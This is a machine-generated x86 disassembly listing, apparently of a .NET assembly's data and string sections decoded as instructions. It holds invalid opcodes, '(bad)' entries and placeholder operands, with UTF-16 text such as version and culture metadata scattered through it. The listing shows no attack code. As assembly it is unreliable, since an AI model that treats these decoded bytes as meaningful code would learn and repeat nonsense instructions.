  403fac:	arpl   WORD PTR [edi+0x72],bp
  403faf:	ins    BYTE PTR es:[edi],dx
  403fb0:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  403fb7:	jae    0x404022
  403fb9:	outs   dx,DWORD PTR ds:[esi]
  403fba:	outs   dx,BYTE PTR ds:[esi]
  403fbb:	cmp    eax,0x2e302e32
  403fc0:	xor    BYTE PTR [esi],ch
  403fc2:	xor    BYTE PTR [eax+eiz*1],ch
  403fc5:	inc    ebx
  403fc6:	jne    0x404034
  403fc8:	je     0x40403f
  403fca:	jb     0x404031
  403fcc:	cmp    eax,0x7475656e
  403fd1:	jb     0x404034
  403fd3:	ins    BYTE PTR es:[edi],dx
  403fd4:	sub    al,0x20
  403fd6:	push   eax
  403fd7:	jne    0x40403b
  403fd9:	ins    BYTE PTR es:[edi],dx
  403fda:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  403fe1:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  403fe5:	bound  esi,QWORD PTR [edi]
  403fe7:	aaa    
  403fe8:	popa   
  403fe9:	xor    eax,0x31363563
  403fee:	cmp    DWORD PTR [ebx],esi
  403ff0:	xor    al,0x65
  403ff2:	xor    BYTE PTR [eax],bh
  403ff4:	cmp    DWORD PTR [ebx],esp
  403ff6:	push   ebx
  403ff7:	jns    0x40406c
  403ff9:	je     0x404060
  403ffb:	ins    DWORD PTR es:[edi],dx
  403ffc:	cs push edx
  403ffe:	gs jae 0x404070
  404001:	jne    0x404075
  404003:	arpl   WORD PTR [ebp+0x73],sp
  404006:	cs push edx
  404008:	jne    0x404078
  40400a:	je     0x404075
  40400c:	ins    DWORD PTR es:[edi],dx
  40400d:	gs push edx
  40400f:	gs jae 0x404081
  404012:	jne    0x404086
  404014:	arpl   WORD PTR [ebp+0x53],sp
  404017:	gs je  0x40401c
  40401a:	add    BYTE PTR [eax],al
  40401c:	add    BYTE PTR [eax+eax*1],ch
  40401f:	add    BYTE PTR [eax],al
  404021:	add    BYTE PTR [eax],al
  404023:	add    BYTE PTR [eax],al
  404025:	push   eax
  404026:	inc    ecx
  404027:	inc    esp
  404028:	push   eax
  404029:	inc    ecx
  40402a:	inc    esp
  40402b:	push   eax
  40402c:	dec    ecx
  40402d:	pop    es
  40402e:	mov    ebx,0xfec22d8e
  404033:	mov    ?,ebx
  404035:	repz add DWORD PTR [edi-0x53452658],edx
  40403c:	fidiv  WORD PTR [eax-0x72664e18]
  404042:	outs   dx,BYTE PTR ds:[esi]
  404043:	mov    ah,0xe2
  404045:	jne    0x404036
  404047:	mov    eax,0xc5cd8900
  40404c:	xchg   DWORD PTR [esi-0x34],edi
  40404f:	enter  0x9644,0x0
  404053:	leave  
  404054:	push   0xffffffa6
  404056:	jmp    0x40402a
  404058:	mov    ecx,0x6bd6b039
  40405d:	adc    esp,DWORD PTR [edx+0x175a5d7]
  404063:	(bad)  
  404065:	retf   
  404066:	ins    DWORD PTR es:[edi],dx
  404067:	fnsave [esi+ecx*2]
  40406a:	loope  0x40404f
  40406c:	(bad)  
  40406d:	fcomp  QWORD PTR ds:0xe2f5a9f5
  404073:	clc    
  404074:	add    bh,ah
  404076:	in     eax,dx
  404077:	stc    
  404078:	add    eax,0xe4fc8eba
  40407d:	mov    ah,0x93
  40407f:	dec    dl
  404081:	aad    0xc9
  404083:	jmp    FWORD PTR [ebx+0x4f0974c5]
  404089:	pcmpeqd mm1,QWORD PTR [ecx]
  40408c:	dec    ebp
  40408e:	sbb    dl,BYTE PTR [eax]
  404090:	dec    ebp
  404091:	icebp  
  404092:	inc    eax
  404093:	sbb    eax,0x25566363
  404098:	mov    ebp,0x9826df43
  40409d:	xchg   ecx,eax
  40409e:	cmc    
  40409f:	xor    BYTE PTR [ecx-0x64cf0a6f],bl
  4040a5:	xchg   ecx,eax
  4040a6:	cmc    
  4040a7:	xor    ah,cl
  4040a9:	push   ecx
  4040aa:	cwde   
  4040ab:	xor    al,al
  4040ad:	push   edi
  4040ae:	icebp  
  4040af:	cmp    eax,0x40394a27
  4040b4:	mov    al,ds:0xba4a1414
  4040b9:	push   esi
  4040ba:	scas   eax,DWORD PTR es:[edi]
  4040bb:	push   ecx
  4040bc:	sbb    DWORD PTR [ebp-0x2bffa904],0x71
  4040c3:	pop    ecx
  4040c4:	pop    esi
  4040c5:	arpl   WORD PTR [ebx],bp
  4040c7:	arpl   WORD PTR [ebx+0x296f4706],bx
  4040cd:	or     ebp,DWORD PTR [edi+ebp*2+0xa]
  4040d1:	sahf   
  4040d2:	out    dx,eax
  4040d3:	je     0x404154
  4040d5:	int    0x61
  4040d7:	jnp    0x4040fb
  4040d9:	retf   
  4040da:	mov    ?,WORD PTR [edi+0x23]
  4040dd:	add    BYTE PTR [eax],al
  4040df:	add    BYTE PTR [esi+0x7],cl
  4040e2:	add    BYTE PTR [eax],al
  4040e4:	mov    eax,DWORD PTR [eax]
  4040e6:	add    BYTE PTR [eax],al
  4040e8:	dec    ebp
  4040e9:	push   es
  4040ea:	add    BYTE PTR [eax],al
  4040ec:	pop    esi
  4040ed:	add    DWORD PTR [eax],eax
  4040ef:	add    bl,al
  4040f1:	add    al,0x0
  4040f3:	add    BYTE PTR [eax+0x6],bh
  4040f6:	add    BYTE PTR [eax],al
  4040f8:	xchg   ebx,eax
  4040f9:	add    eax,0x6c60000
  4040fe:	add    BYTE PTR [eax],al
  404100:	lahf   
  404101:	push   es
  404102:	add    BYTE PTR [eax],al
  404104:	jbe    0x404108
  404106:	add    BYTE PTR [eax],al
  404108:	retf   0x0
  40410b:	add    BYTE PTR [ebx],al
  40410d:	add    al,BYTE PTR [eax]
  40410f:	add    dh,ah
  404111:	add    DWORD PTR [eax],eax
  404113:	add    BYTE PTR [esi+0x4],dl
  404119:	add    BYTE PTR [eax],al
  40411b:	add    cl,cl
  40411d:	add    DWORD PTR [eax],eax
  40411f:	add    BYTE PTR [ecx+0x7f000002],bl
  404125:	pop    es
  404126:	add    BYTE PTR [eax],al
  404128:	in     eax,0x2
  40412a:	add    BYTE PTR [eax],al
  40412c:	cmp    DWORD PTR [ebx],eax
  40412e:	add    BYTE PTR [eax],al
  404130:	ins    DWORD PTR es:[edi],dx
  404131:	add    al,0x0
  404133:	add    BYTE PTR [eax+0x0],dl
  404136:	add    BYTE PTR [eax],al
  404138:	hlt    
  404139:	add    al,0x0
  40413b:	add    BYTE PTR [esi],bl
  40413d:	add    DWORD PTR [eax],eax
  40413f:	add    BYTE PTR [ebp+0x47000003],al
  404145:	add    al,BYTE PTR [eax]
  404147:	add    BYTE PTR [esi+0x49000001],bl
  40414d:	add    DWORD PTR [eax],eax
  40414f:	add    BYTE PTR [ecx],cl
  404151:	add    DWORD PTR [eax],eax
  404153:	add    BYTE PTR [ecx-0x3dffffff],cl
  404159:	add    eax,0x6340000
  40415e:	add    BYTE PTR [eax],al
  404160:	or     al,0x3
  404162:	add    BYTE PTR [eax],al
  404164:	xor    eax,0xba000005
  404169:	add    eax,DWORD PTR [eax]
  40416b:	add    ch,ch
  40416d:	push   es
  40416e:	add    BYTE PTR [eax],al
  404170:	ret    0x2
  404173:	add    bl,dh
  404175:	add    eax,0x3f70000
  40417a:	add    BYTE PTR [eax],al
  40417c:	xor    BYTE PTR [eax+eax*1],al
  40417f:	add    BYTE PTR [esi],bl
  404181:	add    al,BYTE PTR [eax]
  404183:	add    BYTE PTR [esi+0x5],ch
  404186:	add    BYTE PTR [eax],al
  404188:	push   esp
  404189:	add    eax,DWORD PTR [eax]
  40418b:	add    dl,al
  40418d:	or     DWORD PTR [eax],eax
  40418f:	add    BYTE PTR [esi],bl
  404191:	inc    ecx
  404192:	add    BYTE PTR [eax+0x0],dh
  404195:	jo     0x404197
  404197:	ins    BYTE PTR es:[edi],dx
  404198:	add    BYTE PTR [ecx+0x0],ch
  40419b:	arpl   WORD PTR [eax],ax
  40419d:	popa   
  40419e:	add    BYTE PTR [eax+eax*1+0x69],dh
  4041a2:	add    BYTE PTR [edi+0x0],ch
  4041a5:	outs   dx,BYTE PTR ds:[esi]
  4041a6:	add    BYTE PTR [eax+eax*1+0x6f],cl
  4041aa:	add    BYTE PTR [edi+0x0],ah
  4041ad:	outs   dx,DWORD PTR ds:[esi]
  4041ae:	add    BYTE PTR [eax],al
  4041b0:	add    BYTE PTR [eax],al
  4041b2:	add    BYTE PTR [eax],ch
  4041b4:	inc    edx
  4041b5:	add    BYTE PTR [ecx+0x0],ah
  4041b8:	add    BYTE PTR fs:[eax+eax*1+0x79],ch
  4041bd:	add    BYTE PTR [esi+0x0],al
  4041c0:	outs   dx,DWORD PTR ds:[esi]
  4041c1:	add    BYTE PTR [edx+0x0],dh
  4041c4:	ins    DWORD PTR es:[edi],dx
  4041c5:	add    BYTE PTR [ebp+0x0],ah
  4041c8:	add    BYTE PTR fs:[eax+0x0],dl
  4041cc:	popa   
  4041cd:	add    BYTE PTR [edx+0x0],dh
  4041d0:	popa   
  4041d1:	add    BYTE PTR [ebp+0x0],ch
  4041d4:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  4041d9:	add    BYTE PTR [edx+0x0],dh
  4041dc:	pop    edi
  4041dd:	add    BYTE PTR [eax],al
  4041df:	add    BYTE PTR [esi],dh
  4041e1:	inc    ebp
  4041e2:	add    BYTE PTR [eax+eax*1+0x6d],ah
  4041e6:	add    BYTE PTR [ebx+0x0],dl
  4041e9:	arpl   WORD PTR [eax],ax
  4041eb:	push   0x6d006500
  4041f0:	add    BYTE PTR [ecx+0x0],ah
  4041f3:	inc    ebp
  4041f4:	add    BYTE PTR [edx+0x0],dh
  4041f7:	jb     0x4041f9
  4041f9:	outs   dx,DWORD PTR ds:[esi]
  4041fa:	add    BYTE PTR [edx+0x0],dh
  4041fd:	push   ebx
  4041fe:	add    BYTE PTR [ebp+0x0],ah
  404201:	jbe    0x404203
  404203:	add    BYTE PTR gs:[edx+0x0],dh
  404207:	imul   eax,DWORD PTR [eax],0x790074
  40420d:	inc    ebp
  40420e:	add    BYTE PTR [edx+0x0],dh
  404211:	jb     0x404213
  404213:	outs   dx,DWORD PTR ds:[esi]
  404214:	add    BYTE PTR [edx+0x0],dh
  404217:	jmp    0x404219
  404219:	add    BYTE PTR [eax],al
  40421b:	cmp    al,BYTE PTR [ebp+0x0]
  40421e:	add    BYTE PTR fs:[ebp+0x0],ch
  404222:	push   ebx
  404223:	add    BYTE PTR [ebx+0x0],ah
  404226:	push   0x6d006500
  40422b:	add    BYTE PTR [ecx+0x0],ah
  40422e:	inc    ebp
  40422f:	add    BYTE PTR [edx+0x0],dh
  404232:	jb     0x404234
  404234:	outs   dx,DWORD PTR ds:[esi]
  404235:	add    BYTE PTR [edx+0x0],dh
  404238:	push   ebx
  404239:	add    BYTE PTR [ebp+0x0],ah
  40423c:	jbe    0x40423e
  40423e:	add    BYTE PTR gs:[edx+0x0],dh
  404242:	imul   eax,DWORD PTR [eax],0x790074
  404248:	push   ebp
  404249:	add    BYTE PTR [esi+0x0],ch
  40424c:	imul   eax,DWORD PTR [eax],0x6e
  40424f:	add    BYTE PTR [edi+0x0],ch
  404252:	ja     0x404254
  404254:	outs   dx,BYTE PTR ds:[esi]
  404255:	add    dl,dh
  404257:	add    BYTE PTR [eax],al
  404259:	add    BYTE PTR [edx],bh
  40425b:	inc    ebp
  40425c:	add    BYTE PTR [eax+eax*1+0x6d],ah
  404260:	add    BYTE PTR [ebx+0x0],dl
  404263:	arpl   WORD PTR [eax],ax
  404265:	push   0x6d006500
  40426a:	add    BYTE PTR [ecx+0x0],ah
  40426d:	inc    ebp
  40426e:	add    BYTE PTR [edx+0x0],dh
  404271:	jb     0x404273
  404273:	outs   dx,DWORD PTR ds:[esi]
  404274:	add    BYTE PTR [edx+0x0],dh
  404277:	push   ebx
  404278:	add    BYTE PTR [ebp+0x0],ah
  40427b:	jbe    0x40427d
  40427d:	add    BYTE PTR gs:[edx+0x0],dh
  404281:	imul   eax,DWORD PTR [eax],0x790074
  404287:	push   edi
  404288:	add    BYTE PTR [ecx+0x0],ah
  40428b:	jb     0x40428d
  40428d:	outs   dx,BYTE PTR ds:[esi]
  40428e:	add    BYTE PTR [ecx+0x0],ch
  404291:	outs   dx,BYTE PTR ds:[esi]
  404292:	add    BYTE PTR [edi+0x0],ah
  404295:	sti    
  404296:	add    BYTE PTR [eax],al
  404298:	add    BYTE PTR [eax],dl
  40429a:	inc    ebp
  40429b:	add    BYTE PTR [eax+0x0],bh
  40429e:	popa   
  40429f:	add    BYTE PTR [ebp+0x0],ch
  4042a2:	jo     0x4042a4
  4042a4:	ins    BYTE PTR es:[edi],dx
  4042a5:	add    BYTE PTR [ebp+0x0],ah
  4042a8:	xor    al,0x0
  4042aa:	add    al,0x1
  4042ac:	add    BYTE PTR [eax],al
  4042ae:	es inc ebp
  4042b0:	add    BYTE PTR [eax+0x0],bh
  4042b3:	popa   
  4042b4:	add    BYTE PTR [ebp+0x0],ch
  4042b7:	jo     0x4042b9
  4042b9:	ins    BYTE PTR es:[edi],dx
  4042ba:	add    BYTE PTR [ebp+0x0],ah
  4042bd:	xor    al,0x0
  4042bf:	inc    esp
  4042c0:	add    BYTE PTR [ebp+0x0],ah
  4042c3:	jae    0x4042c5
  4042c5:	arpl   WORD PTR [eax],ax
  4042c7:	jb     0x4042c9
  4042c9:	imul   eax,DWORD PTR [eax],0x740070
  4042cf:	imul   eax,DWORD PTR [eax],0x6e006f
  4042d5:	cmp    DWORD PTR [ecx],eax
  4042d7:	add    BYTE PTR [eax],al
  4042d9:	adc    BYTE PTR [ebp+0x0],al
  4042dc:	js     0x4042de
  4042de:	popa   
  4042df:	add    BYTE PTR [ebp+0x0],ch
  4042e2:	jo     0x4042e4
  4042e4:	ins    BYTE PTR es:[edi],dx
  4042e5:	add    BYTE PTR [ebp+0x0],ah
  4042e8:	xor    eax,0x16000
  4042ed:	add    BYTE PTR [esi],ah
  4042ef:	inc    ebp
  4042f0:	add    BYTE PTR [eax+0x0],bh
  4042f3:	popa   
  4042f4:	add    BYTE PTR [ebp+0x0],ch
  4042f7:	jo     0x4042f9
  4042f9:	ins    BYTE PTR es:[edi],dx
  4042fa:	add    BYTE PTR [ebp+0x0],ah
  4042fd:	xor    eax,0x65004400
  404302:	add    BYTE PTR [ebx+0x0],dh
  404305:	arpl   WORD PTR [eax],ax
  404307:	jb     0x404309
  404309:	imul   eax,DWORD PTR [eax],0x740070
  40430f:	imul   eax,DWORD PTR [eax],0x6e006f
  404315:	test   BYTE PTR [ecx],al
  404317:	add    BYTE PTR [eax],al
  404319:	adc    BYTE PTR [ebp+0x0],al
  40431c:	js     0x40431e
  40431e:	popa   
  40431f:	add    BYTE PTR [ebp+0x0],ch
  404322:	jo     0x404324
  404324:	ins    BYTE PTR es:[edi],dx
  404325:	add    BYTE PTR [ebp+0x0],ah
  404328:	add    BYTE PTR ss:[ecx+eax*1+0x45260000],dh
  404330:	add    BYTE PTR [eax+0x0],bh
  404333:	popa   
  404334:	add    BYTE PTR [ebp+0x0],ch
  404337:	jo     0x404339
  404339:	ins    BYTE PTR es:[edi],dx
  40433a:	add    BYTE PTR [ebp+0x0],ah
  40433d:	add    BYTE PTR ss:[eax+eax*1+0x65],al
  404342:	add    BYTE PTR [ebx+0x0],dh
  404345:	arpl   WORD PTR [eax],ax
  404347:	jb     0x404349
  404349:	imul   eax,DWORD PTR [eax],0x740070
  40434f:	imul   eax,DWORD PTR [eax],0x6e006f
  404355:	fadd   DWORD PTR [ecx]
  404357:	add    BYTE PTR [eax],al
  404359:	sbb    BYTE PTR [ebp+0x0],al
  40435c:	js     0x40435e
  40435e:	popa   
  40435f:	add    BYTE PTR [ebp+0x0],ch
  404362:	jo     0x404364
  404364:	ins    BYTE PTR es:[edi],dx
  404365:	add    BYTE PTR [ebp+0x0],ah
  404368:	push   esp
  404369:	add    BYTE PTR [ecx+0x0],ch
  40436c:	je     0x40436e
  40436e:	ins    BYTE PTR es:[edi],dx
  40436f:	add    BYTE PTR [ebp+0x0],ah
  404372:	or     eax,DWORD PTR [edx]
  404374:	add    BYTE PTR [eax],al
  404376:	sbb    BYTE PTR [ebp+0x0],al
  404379:	js     0x40437b
  40437b:	arpl   WORD PTR [eax],ax
  40437d:	ins    BYTE PTR es:[edi],dx
  40437e:	add    BYTE PTR [ebp+0x0],dh
  404381:	jae    0x404383
  404383:	imul   eax,DWORD PTR [eax],0x650076
  404389:	push   ebp
  40438a:	add    BYTE PTR [edx+0x0],dh
  40438d:	imul   eax,DWORD PTR [eax],0x215
  404393:	push   ss
  404394:	inc    esi
  404395:	add    BYTE PTR [ecx+0x0],ch
  404398:	ins    BYTE PTR es:[edi],dx
  404399:	add    BYTE PTR [ebp+0x0],ah
  40439c:	push   ebp
  40439d:	add    BYTE PTR [esi+0x0],ch
  4043a0:	imul   eax,DWORD PTR [eax],0x6e
  4043a3:	add    BYTE PTR [edi+0x0],ch
  4043a6:	ja     0x4043a8
  4043a8:	outs   dx,BYTE PTR ds:[esi]
  4043a9:	add    BYTE PTR [edx+0x24000002],bh
  4043af:	inc    edi
  4043b0:	add    BYTE PTR [ebp+0x0],ah
  4043b3:	outs   dx,BYTE PTR ds:[esi]
  4043b4:	add    BYTE PTR [ebp+0x0],ah
  4043b7:	jb     0x4043b9
  4043b9:	popa   
  4043ba:	add    BYTE PTR [eax+eax*1+0x69],dh
  4043be:	add    BYTE PTR [edi+0x0],ch
  4043c1:	outs   dx,BYTE PTR ds:[esi]
  4043c2:	add    BYTE PTR [ebx+0x0],al
  4043c5:	outs   dx,DWORD PTR ds:[esi]
  4043c6:	add    BYTE PTR [ebp+0x0],ch
  4043c9:	jo     0x4043cb
  4043cb:	ins    BYTE PTR es:[edi],dx
  4043cc:	add    BYTE PTR [ebp+0x0],ah
  4043cf:	je     0x4043d1
  4043d1:	gs add dl,cl
  4043d4:	add    al,BYTE PTR [eax]
  4043d6:	add    BYTE PTR [edx],ch
  4043d8:	dec    ecx
  4043d9:	add    BYTE PTR [esi+0x0],ch
  4043dc:	jbe    0x4043de
  4043de:	popa   
  4043df:	add    BYTE PTR [eax+eax*1+0x69],ch
  4043e3:	add    BYTE PTR [eax+eax*1+0x45],ah
  4043e7:	add    BYTE PTR [esi+0x0],ch
  4043ea:	jne    0x4043ec
  4043ec:	ins    DWORD PTR es:[edi],dx
  4043ed:	add    BYTE PTR [eax+0x0],dl
  4043f0:	popa   
  4043f1:	add    BYTE PTR [edx+0x0],dh
  4043f4:	popa   
  4043f5:	add    BYTE PTR [ebp+0x0],ch
  4043f8:	push   esi
  4043f9:	add    BYTE PTR [ecx+0x0],ah
  4043fc:	ins    BYTE PTR es:[edi],dx
  4043fd:	add    BYTE PTR [ebp+0x0],dh
  404400:	gs add bl,bh
  404403:	add    al,BYTE PTR [eax]
  404405:	add    BYTE PTR [esi],bl
  404407:	dec    ecx
  404408:	add    BYTE PTR [esi+0x0],ch
  40440b:	jbe    0x40440d
  40440d:	popa   
  40440e:	add    BYTE PTR [eax+eax*1+0x69],ch
  404412:	add    BYTE PTR [eax+eax*1+0x46],ah
  404416:	add    BYTE PTR [ecx+0x0],ch
  404419:	ins    BYTE PTR es:[edi],dx
  40441a:	add    BYTE PTR [ebp+0x0],ah
  40441d:	push   esp
  40441e:	add    BYTE PTR [ecx+0x0],bh
  404421:	jo     0x404423
  404423:	add    BYTE PTR gs:[eax+0x3],bl
  404427:	add    BYTE PTR [eax],al
  404429:	and    al,0x49
  40442b:	add    BYTE PTR [esi+0x0],ch
  40442e:	jbe    0x404430
  404430:	popa   
  404431:	add    BYTE PTR [eax+eax*1+0x69],ch
  404435:	add    BYTE PTR [eax+eax*1+0x50],ah
  404439:	add    BYTE PTR [ecx+0x0],ah
  40443c:	jb     0x40443e
  40443e:	popa   
  40443f:	add    BYTE PTR [ebp+0x0],ch
  404442:	push   ebx
  404443:	add    BYTE PTR [edi+0x0],dh
  404446:	imul   eax,DWORD PTR [eax],0x630074
  40444c:	push   0x3b900
  404451:	add    BYTE PTR [esi],bl
  404453:	dec    ebp
  404454:	add    BYTE PTR [ecx+0x0],ch
  404457:	jae    0x404459
  404459:	jae    0x40445b
  40445b:	imul   eax,DWORD PTR [eax],0x67006e
  404461:	inc    esi
  404462:	add    BYTE PTR [ecx+0x0],ch
  404465:	ins    BYTE PTR es:[edi],dx
  404466:	add    BYTE PTR [ebp+0x0],ah
  404469:	dec    esi
  40446a:	add    BYTE PTR [ecx+0x0],ah
  40446d:	ins    DWORD PTR es:[edi],dx
  40446e:	add    BYTE PTR [ebp+0x0],ah
  404471:	fild   WORD PTR [ebx]
  404473:	add    BYTE PTR [eax],al
  404475:	and    cl,BYTE PTR [ebp+0x0]
  404478:	imul   eax,DWORD PTR [eax],0x730073
  40447e:	imul   eax,DWORD PTR [eax],0x67006e
  404484:	push   eax
  404485:	add    BYTE PTR [ecx+0x0],ah
  404488:	jb     0x40448a
  40448a:	popa   
  40448b:	add    BYTE PTR [ebp+0x0],ch
  40448e:	push   esi
  40448f:	add    BYTE PTR [ecx+0x0],ah
  404492:	ins    BYTE PTR es:[edi],dx
  404493:	add    BYTE PTR [ebp+0x0],dh
  404496:	add    BYTE PTR gs:0x28000004,ch
  40449d:	dec    ebp
  40449e:	add    BYTE PTR [ecx+0x0],ch
  4044a1:	jae    0x4044a3
  4044a3:	jae    0x4044a5
  4044a5:	imul   eax,DWORD PTR [eax],0x67006e
  4044ab:	push   edx
  4044ac:	add    BYTE PTR [ebp+0x0],ah
  4044af:	jno    0x4044b1
  4044b1:	jne    0x4044b3
  4044b3:	imul   eax,DWORD PTR [eax],0x650072
  4044b9:	add    BYTE PTR fs:[eax+0x0],dl
  4044bd:	popa   
  4044be:	add    BYTE PTR [edx+0x0],dh
  4044c1:	popa   
  4044c2:	add    BYTE PTR [ebp+0x0],ch
  4044c5:	push   esp
  4044c6:	add    al,0x0
  4044c8:	add    BYTE PTR [esi],dl
  4044ca:	dec    esi
  4044cb:	add    BYTE PTR [edi+0x0],ch
  4044ce:	inc    ecx
  4044cf:	add    BYTE PTR [edx+0x0],dh
  4044d2:	add    BYTE PTR [di+0x0],dh
  4044d6:	ins    DWORD PTR es:[edi],dx
  4044d7:	add    BYTE PTR [ebp+0x0],ah
  4044da:	outs   dx,BYTE PTR ds:[esi]
  4044db:	add    BYTE PTR [eax+eax*1+0x73],dh
  4044df:	add    BYTE PTR [esi+0x4],bh
  4044e2:	add    BYTE PTR [eax],al
  4044e4:	sub    al,0x50
  4044e6:	add    BYTE PTR [ecx+0x0],ah
  4044e9:	je     0x4044eb
  4044eb:	push   0x72004100
  4044f0:	add    BYTE PTR [edi+0x0],ah
  4044f3:	jne    0x4044f5
  4044f5:	ins    DWORD PTR es:[edi],dx
  4044f6:	add    BYTE PTR [ebp+0x0],ah
  4044f9:	outs   dx,BYTE PTR ds:[esi]
  4044fa:	add    BYTE PTR [eax+eax*1+0x49],dh
  4044fe:	add    BYTE PTR [ebx+0x0],dh
  404501:	dec    esi
  404502:	add    BYTE PTR [edi+0x0],ch
  404505:	je     0x404507
  404507:	push   esi
  404508:	add    BYTE PTR [ecx+0x0],ah
  40450b:	ins    BYTE PTR es:[edi],dx
  40450c:	add    BYTE PTR [ecx+0x0],ch
  40450f:	fs add dh,al
  404512:	add    al,0x0
  404514:	add    BYTE PTR [eax],dh
  404516:	push   esp
  404517:	add    BYTE PTR [edi+0x0],ch
  40451a:	outs   dx,DWORD PTR ds:[esi]
  40451b:	add    BYTE PTR [ebp+0x0],cl
  40451e:	popa   
  40451f:	add    BYTE PTR [esi+0x0],ch
  404522:	jns    0x404524
  404524:	inc    esi
  404525:	add    BYTE PTR [ecx+0x0],ch
  404528:	ins    BYTE PTR es:[edi],dx
  404529:	add    BYTE PTR [ebp+0x0],ah
  40452c:	jae    0x40452e
  40452e:	inc    esi
  40452f:	add    BYTE PTR [edi+0x0],ch
  404532:	jb     0x404534
  404534:	push   eax
  404535:	add    BYTE PTR [ecx+0x0],ah
  404538:	jb     0x40453a
  40453a:	popa   
  40453b:	add    BYTE PTR [ebp+0x0],ch
  40453e:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  404543:	add    BYTE PTR [edx+0x0],dh
  404546:	adc    eax,0x38000005
  40454b:	push   ebp
  40454c:	add    BYTE PTR [esi+0x0],ch
  40454f:	popa   
  404550:	add    BYTE PTR [edx+0x0],ah
  404553:	ins    BYTE PTR es:[edi],dx
  404554:	add    BYTE PTR [ebp+0x0],ah
  404557:	push   esp
  404558:	add    BYTE PTR [edi+0x0],ch
  40455b:	inc    esi
  40455c:	add    BYTE PTR [ecx+0x0],ch
  40455f:	outs   dx,BYTE PTR ds:[esi]
  404560:	add    BYTE PTR [eax+eax*1+0x53],ah
  404564:	add    BYTE PTR [eax+0x0],dh
  404567:	add    BYTE PTR gs:[ebx+0x0],ah
  40456b:	imul   eax,DWORD PTR [eax],0x690066
  404571:	add    BYTE PTR gs:[eax+eax*1+0x44],ah
  404576:	add    BYTE PTR [ecx+0x0],ch
  404579:	jb     0x40457b
  40457b:	push   eax
  40457c:	add    BYTE PTR [ecx+0x0],ah
  40457f:	je     0x404581
  404581:	push   0x5d700
  404586:	add    BYTE PTR [edx*2+0x61007300],dh
  40458d:	add    BYTE PTR [edi+0x0],ah
  404590:	add    BYTE PTR gs:[eax+eax*1+0x61],al
  404595:	add    BYTE PTR [eax+eax*1+0x61],dh
  404599:	add    BYTE PTR [ebx+0x0],dl
  40459c:	add    BYTE PTR gs:[edx+0x0],dh
  4045a0:	jbe    0x4045a2
  4045a2:	imul   eax,DWORD PTR [eax],0x650063
  4045a8:	inc    ebx
  4045a9:	add    BYTE PTR [edi+0x0],ch
  4045ac:	ins    BYTE PTR es:[edi],dx
  4045ad:	add    BYTE PTR [eax+eax*1+0x65],ch
  4045b1:	add    BYTE PTR [ebx+0x0],ah
  4045b4:	je     0x4045b6
  4045b6:	imul   eax,DWORD PTR [eax],0x6e006f
  4045bc:	es push es
  4045be:	add    BYTE PTR [eax],al
  4045c0:	cmp    BYTE PTR [ebp+0x0],dl
  4045c3:	jae    0x4045c5
  4045c5:	popa   
  4045c6:	add    BYTE PTR [edi+0x0],ah
  4045c9:	add    BYTE PTR gs:[eax+eax*1+0x65],al
  4045ce:	add    BYTE PTR [ebx+0x0],dh
  4045d1:	arpl   WORD PTR [eax],ax
  4045d3:	jb     0x4045d5
  4045d5:	imul   eax,DWORD PTR [eax],0x740070
  4045db:	imul   eax,DWORD PTR [eax],0x6e006f
  4045e1:	inc    ecx
  4045e2:	add    BYTE PTR [esi+0x0],ch
  4045e5:	add    BYTE PTR fs:[ebx+0x0],dl
  4045e9:	push   0x72006f00
  4045ee:	add    BYTE PTR [eax+eax*1+0x46],dh
  4045f2:	add    BYTE PTR [edi+0x0],ch
  4045f5:	jb     0x4045f7
  4045f7:	ins    DWORD PTR es:[edi],dx
  4045f8:	add    BYTE PTR [edi+0x6],bl
  4045fb:	add    BYTE PTR [eax],al
  4045fd:	and    al,0x55
  4045ff:	add    BYTE PTR [ebx+0x0],dh
  404602:	popa   
  404603:	add    BYTE PTR [edi+0x0],ah
  404606:	add    BYTE PTR gs:[esi+0x0],al
  40460a:	imul   eax,DWORD PTR [eax],0x65006c
  404610:	push   esi
  404611:	add    BYTE PTR [ecx+0x0],ah
  404614:	ins    BYTE PTR es:[edi],dx
  404615:	add    BYTE PTR [ebp+0x0],dh
  404618:	add    BYTE PTR gs:[esi+0x0],cl
  40461c:	popa   
  40461d:	add    BYTE PTR [ebp+0x0],ch
  404620:	add    BYTE PTR gs:[edi+0x6],dh
  404624:	add    BYTE PTR [eax],al
  404626:	sub    BYTE PTR [ebp+0x0],dl
  404629:	jae    0x40462b
  40462b:	popa   
  40462c:	add    BYTE PTR [edi+0x0],ah
  40462f:	add    BYTE PTR gs:[eax+0x0],cl
  404633:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  404638:	add    BYTE PTR [eax+eax*1+0x65],al
  40463c:	add    BYTE PTR [ebx+0x0],dh
  40463f:	arpl   WORD PTR [eax],ax
  404641:	jb     0x404643
  404643:	imul   eax,DWORD PTR [eax],0x740070
  404649:	imul   eax,DWORD PTR [eax],0x6e006f
  40464f:	jge    0x404657
  404651:	add    BYTE PTR [eax],al
  404653:	sub    al,0x55
  404655:	add    BYTE PTR [ebx+0x0],dh
  404658:	popa   
  404659:	add    BYTE PTR [edi+0x0],ah
  40465c:	add    BYTE PTR gs:[ecx+0x0],cl
  404660:	outs   dx,BYTE PTR ds:[esi]
  404661:	add    BYTE PTR [ebx+0x0],al
  404664:	jae    0x404666
  404666:	add    BYTE PTR fs:[eax+eax*1+0x44],ch
  40466b:	add    BYTE PTR [ebp+0x0],ah
  40466e:	jae    0x404670
  404670:	arpl   WORD PTR [eax],ax
  404672:	jb     0x404674
  404674:	imul   eax,DWORD PTR [eax],0x740070
  40467a:	imul   eax,DWORD PTR [eax],0x6e006f
  404680:	cwde   
  404681:	push   es
  404682:	add    BYTE PTR [eax],al
  404684:	cmp    al,0x55
  404686:	add    BYTE PTR [ebx+0x0],dh
  404689:	popa   
  40468a:	add    BYTE PTR [edi+0x0],ah
  40468d:	add    BYTE PTR gs:[eax+eax*1+0x61],cl
  404692:	add    BYTE PTR [esi+0x0],ch
  404695:	add    BYTE PTR [di+0x0],dh
  404699:	popa   
  40469a:	add    BYTE PTR [edi+0x0],ah
  40469d:	add    BYTE PTR gs:[ebx+0x0],al
  4046a1:	push   ebx
  4046a2:	add    BYTE PTR [eax+0x0],ch
  4046a5:	popa   
  4046a6:	add    BYTE PTR [edx+0x0],dh
  4046a9:	jo     0x4046ab
  4046ab:	inc    esp
  4046ac:	add    BYTE PTR [ebp+0x0],ah
